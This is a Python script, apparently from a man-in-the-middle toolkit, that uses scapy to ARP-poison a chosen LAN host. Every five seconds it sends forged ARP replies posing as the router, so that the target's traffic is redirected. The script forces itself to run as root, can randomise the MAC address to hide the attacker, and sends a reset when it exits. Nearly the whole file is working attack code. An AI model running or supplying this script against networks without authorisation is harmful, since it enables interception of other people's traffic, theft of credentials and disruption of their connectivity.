#!/usr/bin/env python

"""
Arp poisons a target; and resets the arp poison on exit.
Uses default interface, router and ip

    usage: arp.py [<target>] [options]

    optional arguments:
      -h, --help              Show this help message and exit
      -l, --loglevel=X        logging level [default: 10]

      -m, --changemac         Change to random mac address (can take 30 secs)
      -r, --reset             Reset arp poison (should happen on exit anyway)
"""
import os
import sys

# force run as root
if not os.geteuid()==0:
    os.execvp("sudo", ["env", "PYTHONPATH=%s"%os.environ.get("PYTHONPATH","")] + sys.argv)

import logging as log
log.getLogger("scapy.runtime").setLevel(log.ERROR)

from scapy.all import send, ARP, sr1, IP, ICMP
from mim.tools import su, setTitle, fwreset
from mim.bash import arp, route
import time
from docopt import docopt

FREQ = 5

def main():
    args = docopt(__doc__, version='arp 1.0')
    if not args["<target>"]:
        args["<target>"] = "192.168.0.8"

    log.getLogger().setLevel(int(args["--loglevel"]))

    # get router
    try:
        router = route().ifaces[0]
    except:
        log.warning("Default route not found")
        sys.exit()

    # arp reset
    if args["--reset"]:
        unpoison(router.ip, args["<target>"])
        fwreset()
        sys.exit()
    
    # check target is reachable before sending ARP poison. Otherwise scapy sends broadcast ARP poison.
    # Note arp used as ping does not get response from windows machines.
    response = sr1(ARP(pdst=args["<target>"]), timeout=2, verbose=0)
    if not response:
        log.info("%s target not found" % args["<target>"])
        fwreset()
        sys.exit()

    # change MAC address for extra anonymity
    # only do this if happy to wait 20 seconds to bring network down and up
    if args["--changemac"]:
        su('ifconfig %s down' % router.name)
        su('macchanger -r %s' % router.name)
        log.info("waiting for network to come back up")
        su('ifconfig %s up' % router.name)
        su('dhclient %s' % router.name)

    poison(router.ip, args["<target>"])
    unpoison(router.ip, args["<target>"])
    fwreset()


def poison(src, target):
    """ repeatedly send fake message from router with our MAC address """
    try:
        seconds = 0
        log.info("Starting ARP poison every %s seconds. Router=%s Target=%s" % (FREQ, src, target))
        while 1:
            send(ARP(psrc=src, pdst=target))
            time.sleep(FREQ)
            seconds += FREQ
            log.info("%s seconds elapsed" % seconds)
    except KeyboardInterrupt:
        log.info("Poison interrupted by Ctrl-C")
    except:
        log.info("problem sending arp poison")


def unpoison(routerip, target):
    """ get correct MAC for router and send to the target to reset ARP cache """
    hosts = {a.ip : a.mac for a in arp().hosts}

    # if not already in arp cache then ping and try again
    if routerip not in hosts:
        sr1(IP(dst=routerip)/ICMP())
        hosts = {a.ip : a.mac for a in arp().hosts}
    if routerip not in hosts:
        log.warning("Router MAC address not found. Could not remove ARP poison.")
        sys.exit()
    log.info("Unpoison sent to %s for gateway %s at mac address %s" % (target, routerip, hosts[routerip]))
    send(ARP(psrc=routerip, hwsrc=hosts[routerip], pdst=target))

setTitle(__file__)
main()